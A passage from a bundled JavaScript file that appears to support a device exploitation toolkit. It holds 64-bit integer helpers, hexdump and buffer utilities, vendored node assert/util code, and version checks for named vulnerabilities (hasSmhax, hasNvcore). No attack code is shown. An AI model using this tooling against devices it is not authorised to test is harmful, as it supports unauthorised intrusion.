	return [this.assertu32(arr[0]), this.assertu32(arr[1])];
};

exports.trunc32 = function (num) {
	if(Array.isArray(num)) {
		if(num[1] !== 0) {
			throw new Error("high 32 bits must be clear");
		}
		return this.assertu32(num[0]);
	} else if(typeof(num) === "number") {
		return this.assertu32(num);
	} else {
		throw new Error("expected [lo,hi] or u32");
	}
};

// truncate to less than 32 bits, will always return number
// throw when truncating non-zero bits
exports.trunclt32 = function (num, bits) {
	if(bits > 32) {
		throw new Error("can't truncate > 32 bits with trunclt32");
	}
	if(Array.isArray(num) && this.assertu64(num)) {
		if(num[1] !== 0) {
			throw new Error("high " + (64-bits) + " bits must be clear");
		}
		num = this.assertu32(num[0]);
	} else if(typeof(num) === "number") {
		num = this.assertu32(num);
	} else {
		throw new Error("expected [lo,hi] or u32");
	}
	// for some reason, a >> 32 == a. that makes literally no sense.
	if(bits == 32 ? 0 : (num >> bits) > 0) {
		throw new Error("number is too large for " + bits + " bits");
	}
	return num;
};

// truncate to less than 64 bits, will always return [lo, hi]
// throw when truncating non-zero bits
exports.trunclt64 = function (num, bits) {
	num = this.pad64(num);
	if(this.bits <= 32) {
		return [this.trunclt32(num), 0];
	}
	// for some reason, a >> 32 == a. that makes literally no sense.
	if(bits == 64 ? 0 : (num[1] >> (bits-32)) > 0) {
		throw new Error("number is too large for " + bits + " bits");
	}
	return num;
};

exports.pad64 = function (num) {
	if(Array.isArray(num)) {
		return this.assertu64(num);
	} else if(typeof(num) === "number") {
		return [this.assertu32(num), 0];
	} else {
		throw new Error("expected [lo,hi] or number");
	}
};

function sleep(ms) {
	var timestamp = new Date().getTime();

	while (true) {
		if (new Date().getTime() > timestamp + ms) {
			break;
		}
	}
}

console = {
	log: function (msg) {
		if (config.debug) {
			exports.send('log', msg);
		} else {
			sleep(25);
		}
	}
};

var log = console.log;

exports.log = log;

exports.dump = function (name, buf, count) {
	for (var j = 0; j < count; ++j) { utils.log(name + '[' + j + '] == 0x' + buf[j].toString(16)); }
};

exports.hexdump = function (name, inp, count) {
	var buf;
	var u8b;

	if (inp instanceof ArrayBuffer || inp instanceof Uint32Array) {
		buf = inp;
		u8b = new Uint8Array((inp instanceof ArrayBuffer) ? buf : buf.buffer);
		if (count === undefined) {
			count = u8b.length;
		}
	} else {
		buf = new ArrayBuffer(inp.length * 4);
		var u32b = new Uint32Array(buf);
		u8b = new Uint8Array(buf);
		if (count === undefined) {
			count = u8b.length;
		}
		for (var i = 0; i < inp.length && i < count; i++) {
			u32b[i] = inp[i];
		}
	}
	var rows = Math.ceil(count / 16.0);
	var addrColumnWidth = (name + '+0x' + (rows * 16).toString(16)).length;
	var dumpWidth = (3 * 16) + 1; // 2 characters + 1 space for each of the 16 bytes, and the space between u32s

	function rjust (string, width, chr) {
		var fill = '';
		while (fill.length < width - string.length) {
			fill += chr;
		}
		return fill + string;
	}

	function ljust (string, width, chr) {
		var fill = '';
		while (fill.length < width - string.length) {
			fill += chr;
		}
		return string + fill;
	}

	for (i = 0; i < rows; i++) {
		var offset = i * 16;
		var hexlinedump = '';
		var asciilinedump = '';
		for (var j = 0; j < 16 && offset + j < count; j++) {
			if (j !== 0) {
				hexlinedump += ' ';
			}
			hexlinedump += rjust(u8b[offset + j].toString(16), 2, '0');
			if (j === 7) hexlinedump += ' ';

			asciilinedump += String.fromCharCode(u8b[offset + j]).replace(/[^\x20-\x7E]+/g, '.');
		}
		var linedump = ljust(hexlinedump, dumpWidth, ' ') + '| ' + ljust(asciilinedump, 16, ' ') + ' |';
		utils.log(ljust(name + '+0x' + offset.toString(16), addrColumnWidth, ' ') + ' | ' + linedump);
	}
};

exports.str2ab = function (str, length) {
	if(length === undefined) {
		length = str.length + 1;
	} else {
		if(length < str.length + 1) {
			throw new Error("buffer is too small to pack string");
		}
	}
	var ab = new ArrayBuffer(length);
	var u8 = new Uint8Array(ab);
	for (var i = 0; i < str.length; i++) {
		u8[i] = str.charCodeAt(i);
	}
	u8[str.length + 1] = 0;
	return ab;
};

exports.u8a2str = function (u8) {
	var str = "";
	for (var i = 0; i < u8.length; i++) {
		str+= String.fromCharCode(u8[i]);
	}
	return str;
};

exports.u8a2nullstr = function (u8) {
	var str = "";
	for (var i = 0; i < u8.length; i++) {
		if(u8[i] === 0) {
			break;
		}
		str+= String.fromCharCode(u8[i]);
	}
	return str;
};

exports.str2u64 = function (inp) {
	if (inp.length > 8) {
		throw new Error("string too long");
	}
	if (inp.length === 0) {
		return [0, 0];
	}
	var len = 8;
	var buf = new ArrayBuffer(len);
	var u8b = new Uint8Array(buf);
	for (var j = 0; j < inp.length; ++j) { u8b[j] = inp.charCodeAt(j); }
	for (j = inp.length; j < len; ++j) { u8b[j] = 0; }

	var u32b = new Uint32Array(buf);
	return [u32b[0], u32b[1]];
};

exports.version = 0;

exports.hasSmhax = function () {
    return exports.version < 301;
}

exports.hasNvcore = function (ver) {
	if (ver == '3.0.1' || ver == '3.0.2' || ver == '4.0.0' || ver == '4.0.1' || ver == '4.1.0') {
		return true;
	}

	return false;
}


},{"../config":1}],21:[function(require,module,exports){
(function (global){
'use strict';

var objectAssign = require('object-assign');

// compare and isBuffer taken from https://github.com/feross/buffer/blob/680e9e5e488f22aac27599a57dc844a6315928dd/index.js
// original notice:

/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <feross@feross.org> <http://feross.org>
 * @license  MIT
 */
function compare(a, b) {
  if (a === b) {
    return 0;
  }

  var x = a.length;
  var y = b.length;

  for (var i = 0, len = Math.min(x, y); i < len; ++i) {
    if (a[i] !== b[i]) {
      x = a[i];
      y = b[i];
      break;
    }
  }

  if (x < y) {
    return -1;
  }
  if (y < x) {
    return 1;
  }
  return 0;
}
function isBuffer(b) {
  if (global.Buffer && typeof global.Buffer.isBuffer === 'function') {
    return global.Buffer.isBuffer(b);
  }
  return !!(b != null && b._isBuffer);
}

// based on node assert, original notice:
// NB: The URL to the CommonJS spec is kept just for tradition.
//     node-assert has evolved a lot since then, both in API and behavior.

// http://wiki.commonjs.org/wiki/Unit_Testing/1.0
//
// THIS IS NOT TESTED NOR LIKELY TO WORK OUTSIDE V8!
//
// Originally from narwhal.js (http://narwhaljs.org)
// Copyright (c) 2009 Thomas Robinson <280north.com>
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the 'Software'), to
// deal in the Software without restriction, including without limitation the
// rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
// sell copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
// ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
// WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

var util = require('util/');
var hasOwn = Object.prototype.hasOwnProperty;
var pSlice = Array.prototype.slice;
var functionsHaveNames = (function () {
  return function foo() {}.name === 'foo';
}());
function pToString (obj) {
  return Object.prototype.toString.call(obj);
}
function isView(arrbuf) {
  if (isBuffer(arrbuf)) {
    return false;
  }
  if (typeof global.ArrayBuffer !== 'function') {
    return false;
  }
  if (typeof ArrayBuffer.isView === 'function') {
    return ArrayBuffer.isView(arrbuf);
  }
  if (!arrbuf) {
    return false;
  }
  if (arrbuf instanceof DataView) {
    return true;
  }
  if (arrbuf.buffer && arrbuf.buffer instanceof ArrayBuffer) {
    return true;
  }
  return false;
}
// 1. The assert module provides functions that throw
// AssertionError's when particular conditions are not met. The
// assert module must conform to the following interface.

var assert = module.exports = ok;

// 2. The AssertionError is defined in assert.
// new assert.AssertionError({ message: message,
//                             actual: actual,
//                             expected: expected })

var regex = /\s*function\s+([^\(\s]*)\s*/;
// based on https://github.com/ljharb/function.prototype.name/blob/adeeeec8bfcc6068b187d7d9fb3d5bb1d3a30899/implementation.js
function getName(func) {
  if (!util.isFunction(func)) {
    return;
  }
  if (functionsHaveNames) {
    return func.name;
  }
  var str = func.toString();
  var match = str.match(regex);
  return match && match[1];
}
assert.AssertionError = function AssertionError(options) {
  this.name = 'AssertionError';
  this.actual = options.actual;
  this.expected = options.expected;
  this.operator = options.operator;
  if (options.message) {
    this.message = options.message;
    this.generatedMessage = false;
  } else {
    this.message = getMessage(this);
    this.generatedMessage = true;
  }
  var stackStartFunction = options.stackStartFunction || fail;
  if (Error.captureStackTrace) {
    Error.captureStackTrace(this, stackStartFunction);
  } else {
    // non v8 browsers so we can have a stacktrace
    var err = new Error();
    if (err.stack) {
      var out = err.stack;

      // try to strip useless frames
      var fn_name = getName(stackStartFunction);
      var idx = out.indexOf('\n' + fn_name);
      if (idx >= 0) {
        // once we have located the function frame
        // we need to strip out everything before it (and its line)
        var next_line = out.indexOf('\n', idx + 1);
        out = out.substring(next_line + 1);
      }

      this.stack = out;
    }
  }
};

// assert.AssertionError instanceof Error
util.inherits(assert.AssertionError, Error);

function truncate(s, n) {
  if (typeof s === 'string') {
    return s.length < n ? s : s.slice(0, n);
  } else {
    return s;
  }
}
function inspect(something) {
  if (functionsHaveNames || !util.isFunction(something)) {
    return util.inspect(something);
  }
  var rawname = getName(something);
  var name = rawname ? ': ' + rawname : '';
  return '[Function' +  name + ']';
}
function getMessage(self) {
  return truncate(inspect(self.actual), 128) + ' ' +
         self.operator + ' ' +
         truncate(inspect(self.expected), 128);
}

// At present only the three keys mentioned above are used and
// understood by the spec. Implementations or sub modules can pass
// other keys to the AssertionError's constructor - they will be
// ignored.

// 3. All of the following functions must throw an AssertionError
// when a corresponding condition is not met, with a message that
// may be undefined if not provided.  All assertion methods provide
// both the actual and expected values to the assertion error for
// display purposes.

function fail(actual, expected, message, operator, stackStartFunction) {
  throw new assert.AssertionError({
    message: message,
    actual: actual,
    expected: expected,
    operator: operator,
    stackStartFunction: stackStartFunction
  });
}

// EXTENSION! allows for well behaved errors defined elsewhere.
assert.fail = fail;

// 4. Pure assertion tests whether a value is truthy, as determined
// by !!guard.
// assert.ok(guard, message_opt);
// This statement is equivalent to assert.equal(true, !!guard,
// message_opt);. To test strictly for the value true, use
// assert.strictEqual(true, guard, message_opt);.

function ok(value, message) {
  if (!value) fail(value, true, message, '==', assert.ok);
}
assert.ok = ok;

// 5. The equality assertion tests shallow, coercive equality with
// ==.
// assert.equal(actual, expected, message_opt);

assert.equal = function equal(actual, expected, message) {
  if (actual != expected) fail(actual, expected, message, '==', assert.equal);
};

// 6. The non-equality assertion tests for whether two objects are not equal
// with != assert.notEqual(actual, expected, message_opt);

assert.notEqual = function notEqual(actual, expected, message) {
  if (actual == expected) {
    fail(actual, expected, message, '!=', assert.notEqual);
  }
};

// 7. The equivalence assertion tests a deep equality relation.
// assert.deepEqual(actual, expected, message_opt);

assert.deepEqual = function deepEqual(actual, expected, message) {
  if (!_deepEqual(actual, expected, false)) {
    fail(actual, expected, message, 'deepEqual', assert.deepEqual);
  }
};

assert.deepStrictEqual = function deepStrictEqual(actual, expected, message) {
  if (!_deepEqual(actual, expected, true)) {
    fail(actual, expected, message, 'deepStrictEqual', assert.deepStrictEqual);
  }
};

function _deepEqual(actual, expected, strict, memos) {
  // 7.1. All identical values are equivalent, as determined by ===.
  if (actual === expected) {
    return true;
  } else if (isBuffer(actual) && isBuffer(expected)) {
    return compare(actual, expected) === 0;

  // 7.2. If the expected value is a Date object, the actual value is
  // equivalent if it is also a Date object that refers to the same time.
  } else if (util.isDate(actual) && util.isDate(expected)) {
    return actual.getTime() === expected.getTime();

  // 7.3 If the expected value is a RegExp object, the actual value is
  // equivalent if it is also a RegExp object with the same source and
  // properties (`global`, `multiline`, `lastIndex`, `ignoreCase`).
  } else if (util.isRegExp(actual) && util.isRegExp(expected)) {
    return actual.source === expected.source &&
           actual.global === expected.global &&
           actual.multiline === expected.multiline &&
           actual.lastIndex === expected.lastIndex &&
           actual.ignoreCase === expected.ignoreCase;

  // 7.4. Other pairs that do not both pass typeof value == 'object',
  // equivalence is determined by ==.
  } else if ((actual === null || typeof actual !== 'object') &&
             (expected === null || typeof expected !== 'object')) {
    return strict ? actual === expected : actual == expected;

  // If both values are instances of typed arrays, wrap their underlying
  // ArrayBuffers in a Buffer each to increase performance
  // This optimization requires the arrays to have the same type as checked by
  // Object.prototype.toString (aka pToString). Never perform binary
  // comparisons for Float*Arrays, though, since e.g. +0 === -0 but their
  // bit patterns are not identical.
  } else if (isView(actual) && isView(expected) &&
             pToString(actual) === pToString(expected) &&
             !(actual instanceof Float32Array ||
               actual instanceof Float64Array)) {
    return compare(new Uint8Array(actual.buffer),
                   new Uint8Array(expected.buffer)) === 0;

  // 7.5 For all other Object pairs, including Array objects, equivalence is
  // determined by having the same number of owned properties (as verified
  // with Object.prototype.hasOwnProperty.call), the same set of keys
  // (although not necessarily the same order), equivalent values for every
  // corresponding key, and an identical 'prototype' property. Note: this
  // accounts for both named and indexed properties on Arrays.
  } else if (isBuffer(actual) !== isBuffer(expected)) {
    return false;
  } else {
    memos = memos || {actual: [], expected: []};

    var actualIndex = memos.actual.indexOf(actual);
    if (actualIndex !== -1) {
      if (actualIndex === memos.expected.indexOf(expected)) {
        return true;
      }
    }

    memos.actual.push(actual);
    memos.expected.push(expected);

    return objEquiv(actual, expected, strict, memos);
  }
}

function isArguments(object) {
  return Object.prototype.toString.call(object) == '[object Arguments]';
}

function objEquiv(a, b, strict, actualVisitedObjects) {
  if (a === null || a === undefined || b === null || b === undefined)
    return false;
  // if one is a primitive, the other must be same
  if (util.isPrimitive(a) || util.isPrimitive(b))
    return a === b;
  if (strict && Object.getPrototypeOf(a) !== Object.getPrototypeOf(b))
    return false;
  var aIsArgs = isArguments(a);
  var bIsArgs = isArguments(b);
  if ((aIsArgs && !bIsArgs) || (!aIsArgs && bIsArgs))
    return false;
  if (aIsArgs) {
    a = pSlice.call(a);
    b = pSlice.call(b);
    return _deepEqual(a, b, strict);
  }
  var ka = objectKeys(a);
  var kb = objectKeys(b);
  var key, i;
  // having the same number of owned properties (keys incorporates
  // hasOwnProperty)
  if (ka.length !== kb.length)
    return false;
  //the same set of keys (although not necessarily the same order),
  ka.sort();
  kb.sort();
  //~~~cheap key test
  for (i = ka.length - 1; i >= 0; i--) {
    if (ka[i] !== kb[i])
      return false;
  }
  //equivalent values for every corresponding key, and
  //~~~possibly expensive deep test
  for (i = ka.length - 1; i >= 0; i--) {
    key = ka[i];
    if (!_deepEqual(a[key], b[key], strict, actualVisitedObjects))
      return false;
  }
  return true;
}

// 8. The non-equivalence assertion tests for any deep inequality.
// assert.notDeepEqual(actual, expected, message_opt);

assert.notDeepEqual = function notDeepEqual(actual, expected, message) {
  if (_deepEqual(actual, expected, false)) {
    fail(actual, expected, message, 'notDeepEqual', assert.notDeepEqual);
  }
};

assert.notDeepStrictEqual = notDeepStrictEqual;
function notDeepStrictEqual(actual, expected, message) {
  if (_deepEqual(actual, expected, true)) {
    fail(actual, expected, message, 'notDeepStrictEqual', notDeepStrictEqual);
  }
}


// 9. The strict equality assertion tests strict equality, as determined by ===.
// assert.strictEqual(actual, expected, message_opt);

assert.strictEqual = function strictEqual(actual, expected, message) {
  if (actual !== expected) {
    fail(actual, expected, message, '===', assert.strictEqual);
  }
};

// 10. The strict non-equality assertion tests for strict inequality, as
// determined by !==.  assert.notStrictEqual(actual, expected, message_opt);

assert.notStrictEqual = function notStrictEqual(actual, expected, message) {
  if (actual === expected) {
    fail(actual, expected, message, '!==', assert.notStrictEqual);
  }
};

function expectedException(actual, expected) {
  if (!actual || !expected) {
    return false;
  }

  if (Object.prototype.toString.call(expected) == '[object RegExp]') {
    return expected.test(actual);
  }

  try {
    if (actual instanceof expected) {
      return true;
    }
  } catch (e) {
    // Ignore.  The instanceof check doesn't work for arrow functions.
  }

  if (Error.isPrototypeOf(expected)) {
    return false;
  }

  return expected.call({}, actual) === true;
}

function _tryBlock(block) {
  var error;
  try {
    block();
  } catch (e) {
    error = e;
  }
  return error;
}

function _throws(shouldThrow, block, expected, message) {
  var actual;

  if (typeof block !== 'function') {
    throw new TypeError('"block" argument must be a function');
  }

  if (typeof expected === 'string') {
    message = expected;
    expected = null;
  }

  actual = _tryBlock(block);

  message = (expected && expected.name ? ' (' + expected.name + ').' : '.') +
            (message ? ' ' + message : '.');

  if (shouldThrow && !actual) {
    fail(actual, expected, 'Missing expected exception' + message);
  }

  var userProvidedMessage = typeof message === 'string';
  var isUnwantedException = !shouldThrow && util.isError(actual);
  var isUnexpectedException = !shouldThrow && actual && !expected;

  if ((isUnwantedException &&
      userProvidedMessage &&
      expectedException(actual, expected)) ||
      isUnexpectedException) {
    fail(actual, expected, 'Got unwanted exception' + message);
  }

  if ((shouldThrow && actual && expected &&
      !expectedException(actual, expected)) || (!shouldThrow && actual)) {
    throw actual;
  }
}

// 11. Expected to throw an error:
// assert.throws(block, Error_opt, message_opt);

assert.throws = function(block, /*optional*/error, /*optional*/message) {
  _throws(true, block, error, message);
};

// EXTENSION! This is annoying to write outside this module.
assert.doesNotThrow = function(block, /*optional*/error, /*optional*/message) {
  _throws(false, block, error, message);
};

assert.ifError = function(err) { if (err) throw err; };

// Expose a strict only variant of assert
function strict(value, message) {
  if (!value) fail(value, true, message, '==', strict);
}
assert.strict = objectAssign(strict, assert, {
  equal: assert.strictEqual,
  deepEqual: assert.deepStrictEqual,
  notEqual: assert.notStrictEqual,
  notDeepEqual: assert.notDeepStrictEqual
});
assert.strict.strict = assert.strict;

var objectKeys = Object.keys || function (obj) {
  var keys = [];
  for (var key in obj) {
    if (hasOwn.call(obj, key)) keys.push(key);
  }
  return keys;
};

}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})

},{"object-assign":25,"util/":24}],22:[function(require,module,exports){
if (typeof Object.create === 'function') {
  // implementation from standard node.js 'util' module
  module.exports = function inherits(ctor, superCtor) {
    ctor.super_ = superCtor
    ctor.prototype = Object.create(superCtor.prototype, {
      constructor: {
        value: ctor,
        enumerable: false,
        writable: true,
        configurable: true
      }
    });
  };
} else {
  // old school shim for old browsers
  module.exports = function inherits(ctor, superCtor) {
    ctor.super_ = superCtor
    var TempCtor = function () {}
    TempCtor.prototype = superCtor.prototype
    ctor.prototype = new TempCtor()
    ctor.prototype.constructor = ctor
  }
}

},{}],23:[function(require,module,exports){
module.exports = function isBuffer(arg) {
  return arg && typeof arg === 'object'
    && typeof arg.copy === 'function'
    && typeof arg.fill === 'function'
    && typeof arg.readUInt8 === 'function';
}
},{}],24:[function(require,module,exports){
(function (process,global){
// Copyright Joyent, Inc. and other Node contributors.
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, sublicense, and/or sell copies of the Software, and to permit
// persons to whom the Software is furnished to do so, subject to the
// following conditions:
//
// The above copyright notice and this permission notice shall be included
// in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN
// NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
// DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
// OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE
// USE OR OTHER DEALINGS IN THE SOFTWARE.

var formatRegExp = /%[sdj%]/g;
exports.format = function(f) {
  if (!isString(f)) {
    var objects = [];
    for (var i = 0; i < arguments.length; i++) {
      objects.push(inspect(arguments[i]));
    }
    return objects.join(' ');
  }

  var i = 1;
  var args = arguments;
  var len = args.length;
  var str = String(f).replace(formatRegExp, function(x) {
    if (x === '%%') return '%';
    if (i >= len) return x;
    switch (x) {
      case '%s': return String(args[i++]);
      case '%d': return Number(args[i++]);
      case '%j':
        try {
          return JSON.stringify(args[i++]);
        } catch (_) {
          return '[Circular]';
        }
      default:
        return x;
    }
  });
  for (var x = args[i]; i < len; x = args[++i]) {
    if (isNull(x) || !isObject(x)) {
      str += ' ' + x;
    } else {
      str += ' ' + inspect(x);
    }
  }
  return str;
};


// Mark that a method should not be used.
// Returns a modified function which warns once by default.
// If --no-deprecation is set, then it is a no-op.
exports.deprecate = function(fn, msg) {
  // Allow for deprecating things in the process of starting up.
  if (isUndefined(global.process)) {
    return function() {
      return exports.deprecate(fn, msg).apply(this, arguments);
    };
  }

  if (process.noDeprecation === true) {
    return fn;
  }

  var warned = false;
  function deprecated() {
    if (!warned) {
      if (process.throwDeprecation) {
        throw new Error(msg);
      } else if (process.traceDeprecation) {
        console.trace(msg);
      } else {
        console.error(msg);
      }
      warned = true;
    }
    return fn.apply(this, arguments);
  }

  return deprecated;
};


var debugs = {};
var debugEnviron;
exports.debuglog = function(set) {
  if (isUndefined(debugEnviron))
    debugEnviron = process.env.NODE_DEBUG || '';
  set = set.toUpperCase();
  if (!debugs[set]) {
    if (new RegExp('\\b' + set + '\\b', 'i').test(debugEnviron)) {
      var pid = process.pid;
      debugs[set] = function() {
        var msg = exports.format.apply(exports, arguments);
        console.error('%s %d: %s', set, pid, msg);
      };
    } else {
      debugs[set] = function() {};
    }
  }
  return debugs[set];
};


/**
 * Echos the value of a value. Trys to print the value out
 * in the best way possible given the different types.
 *
 * @param {Object} obj The object to print out.
 * @param {Object} opts Optional options object that alters the output.
 */
/* legacy: obj, showHidden, depth, colors*/
function inspect(obj, opts) {
  // default options
  var ctx = {
    seen: [],
    stylize: stylizeNoColor
  };
  // legacy...
  if (arguments.length >= 3) ctx.depth = arguments[2];
  if (arguments.length >= 4) ctx.colors = arguments[3];
  if (isBoolean(opts)) {
    // legacy...
    ctx.showHidden = opts;
  } else if (opts) {
    // got an "options" object
    exports._extend(ctx, opts);
  }
  // set default options
  if (isUndefined(ctx.showHidden)) ctx.showHidden = false;
  if (isUndefined(ctx.depth)) ctx.depth = 2;
  if (isUndefined(ctx.colors)) ctx.colors = false;
  if (isUndefined(ctx.customInspect)) ctx.customInspect = true;
  if (ctx.colors) ctx.stylize = stylizeWithColor;
  return formatValue(ctx, obj, ctx.depth);
}
exports.inspect = inspect;


// http://en.wikipedia.org/wiki/ANSI_escape_code#graphics
inspect.colors = {
  'bold' : [1, 22],
  'italic' : [3, 23],
  'underline' : [4, 24],
  'inverse' : [7, 27],
  'white' : [37, 39],
  'grey' : [90, 39],
  'black' : [30, 39],
  'blue' : [34, 39],
  'cyan' : [36, 39],
  'green' : [32, 39],
  'magenta' : [35, 39],
  'red' : [31, 39],
  'yellow' : [33, 39]
};

// Don't use 'blue' not visible on cmd.exe
inspect.styles = {
  'special': 'cyan',
  'number': 'yellow',
  'boolean': 'yellow',
  'undefined': 'grey',
  'null': 'bold',
  'string': 'green',
  'date': 'magenta',
  // "name": intentionally not styling
  'regexp': 'red'
};


function stylizeWithColor(str, styleType) {
  var style = inspect.styles[styleType];

  if (style) {
    return '\u001b[' + inspect.colors[style][0] + 'm' + str +
           '\u001b[' + inspect.colors[style][1] + 'm';
  } else {
    return str;
  }
}


function stylizeNoColor(str, styleType) {
  return str;
}


function arrayToHash(array) {
  var hash = {};

  array.forEach(function(val, idx) {
    hash[val] = true;
  });

  return hash;
}


function formatValue(ctx, value, recurseTimes) {
  // Provide a hook for user-specified inspect functions.
  // Check that value is an object with an inspect function on it
  if (ctx.customInspect &&
      value &&
      isFunction(value.inspect) &&
      // Filter out the util module, it's inspect function is special
      value.inspect !== exports.inspect &&
      // Also filter out any prototype objects using the circular check.
      !(value.constructor && value.constructor.prototype === value)) {
    var ret = value.inspect(recurseTimes, ctx);
    if (!isString(ret)) {
      ret = formatValue(ctx, ret, recurseTimes);
    }
    return ret;
  }

  // Primitive types cannot have properties
  var primitive = formatPrimitive(ctx, value);
  if (primitive) {
    return primitive;
  }

  // Look up the keys of the object.
  var keys = Object.keys(value);
  var visibleKeys = arrayToHash(keys);

  if (ctx.showHidden) {
    keys = Object.getOwnPropertyNames(value);
  }

  // IE doesn't make error fields non-enumerable
  // http://msdn.microsoft.com/en-us/library/ie/dww52sbt(v=vs.94).aspx
  if (isError(value)
      && (keys.indexOf('message') >= 0 || keys.indexOf('description') >= 0)) {
    return formatError(value);
  }

  // Some type of object without properties can be shortcutted.
  if (keys.length === 0) {
    if (isFunction(value)) {
      var name = value.name ? ': ' + value.name : '';
      return ctx.stylize('[Function' + name + ']', 'special');
    }
    if (isRegExp(value)) {
      return ctx.stylize(RegExp.prototype.toString.call(value), 'regexp');
    }
    if (isDate(value)) {
      return ctx.stylize(Date.prototype.toString.call(value), 'date');
    }
    if (isError(value)) {
      return formatError(value);
    }
  }

  var base = '', array = false, braces = ['{', '}'];

  // Make Array say that they are Array
  if (isArray(value)) {
    array = true;
    braces = ['[', ']'];
  }

  // Make functions say that they are functions
  if (isFunction(value)) {
    var n = value.name ? ': ' + value.name : '';
    base = ' [Function' + n + ']';
  }

  // Make RegExps say that they are RegExps
  if (isRegExp(value)) {
    base = ' ' + RegExp.prototype.toString.call(value);
  }

  // Make dates with properties first say the date
  if (isDate(value)) {
    base = ' ' + Date.prototype.toUTCString.call(value);
  }

  // Make error with message first say the error
  if (isError(value)) {
    base = ' ' + formatError(value);
  }

  if (keys.length === 0 && (!array || value.length == 0)) {
    return braces[0] + base + braces[1];
  }

  if (recurseTimes < 0) {
    if (isRegExp(value)) {
      return ctx.stylize(RegExp.prototype.toString.call(value), 'regexp');
    } else {
      return ctx.stylize('[Object]', 'special');
    }
  }

  ctx.seen.push(value);

  var output;
  if (array) {
    output = formatArray(ctx, value, recurseTimes, visibleKeys, keys);
  } else {
    output = keys.map(function(key) {
      return formatProperty(ctx, value, recurseTimes, visibleKeys, key, array);
    });
  }

  ctx.seen.pop();

  return reduceToSingleString(output, base, braces);
}


function formatPrimitive(ctx, value) {
  if (isUndefined(value))
    return ctx.stylize('undefined', 'undefined');
  if (isString(value)) {
    var simple = '\'' + JSON.stringify(value).replace(/^"|"$/g, '')
                                             .replace(/'/g, "\\'")
                                             .replace(/\\"/g, '"') + '\'';
    return ctx.stylize(simple, 'string');
  }
  if (isNumber(value))
    return ctx.stylize('' + value, 'number');
  if (isBoolean(value))
    return ctx.stylize('' + value, 'boolean');
  // For some reason typeof null is "object", so special case here.
  if (isNull(value))
    return ctx.stylize('null', 'null');
}


function formatError(value) {
  return '[' + Error.prototype.toString.call(value) + ']';
}


function formatArray(ctx, value, recurseTimes, visibleKeys, keys) {
  var output = [];
  for (var i = 0, l = value.length; i < l; ++i) {
    if (hasOwnProperty(value, String(i))) {
      output.push(formatProperty(ctx, value, recurseTimes, visibleKeys,
          String(i), true));
    } else {
      output.push('');
    }
  }
  keys.forEach(function(key) {
    if (!key.match(/^\d+$/)) {
      output.push(formatProperty(ctx, value, recurseTimes, visibleKeys,
          key, true));
    }
  });
  return output;
}


function formatProperty(ctx, value, recurseTimes, visibleKeys, key, array) {
  var name, str, desc;
  desc = Object.getOwnPropertyDescriptor(value, key) || { value: value[key] };
  if (desc.get) {
    if (desc.set) {
      str = ctx.stylize('[Getter/Setter]', 'special');
    } else {
      str = ctx.stylize('[Getter]', 'special');
    }
  } else {
    if (desc.set) {
      str = ctx.stylize('[Setter]', 'special');
    }
  }
  if (!hasOwnProperty(visibleKeys, key)) {
    name = '[' + key + ']';
  }
  if (!str) {
    if (ctx.seen.indexOf(desc.value) < 0) {
      if (isNull(recurseTimes)) {
        str = formatValue(ctx, desc.value, null);
      } else {
        str = formatValue(ctx, desc.value, recurseTimes - 1);
      }
      if (str.indexOf('\n') > -1) {
        if (array) {
          str = str.split('\n').map(function(line) {
            return '  ' + line;
          }).join('\n').substr(2);
        } else {
          str = '\n' + str.split('\n').map(function(line) {
            return '   ' + line;
          }).join('\n');
        }
      }
    } else {
      str = ctx.stylize('[Circular]', 'special');
    }
  }
  if (isUndefined(name)) {
    if (array && key.match(/^\d+$/)) {
      return str;
    }
    name = JSON.stringify('' + key);
    if (name.match(/^"([a-zA-Z_][a-zA-Z_0-9]*)"$/)) {
      name = name.substr(1, name.length - 2);
      name = ctx.stylize(name, 'name');
    } else {
      name = name.replace(/'/g, "\\'")
                 .replace(/\\"/g, '"')
                 .replace(/(^"|"$)/g, "'");
      name = ctx.stylize(name, 'string');
    }
  }

  return name + ': ' + str;
}


function reduceToSingleString(output, base, braces) {
  var numLinesEst = 0;
  var length = output.reduce(function(prev, cur) {
    numLinesEst++;
    if (cur.indexOf('\n') >= 0) numLinesEst++;
    return prev + cur.replace(/\u001b\[\d\d?m/g, '').length + 1;
  }, 0);

  if (length > 60) {
    return braces[0] +
           (base === '' ? '' : base + '\n ') +
           ' ' +
           output.join(',\n  ') +
           ' ' +
           braces[1];
  }

  return braces[0] + base + ' ' + output.join(', ') + ' ' + braces[1];
}


// NOTE: These type checking functions intentionally don't use `instanceof`
// because it is fragile and can be easily faked with `Object.create()`.
function isArray(ar) {
  return Array.isArray(ar);
}
exports.isArray = isArray;

function isBoolean(arg) {
  return typeof arg === 'boolean';
}
exports.isBoolean = isBoolean;

function isNull(arg) {
  return arg === null;
}
exports.isNull = isNull;

function isNullOrUndefined(arg) {
  return arg == null;
}
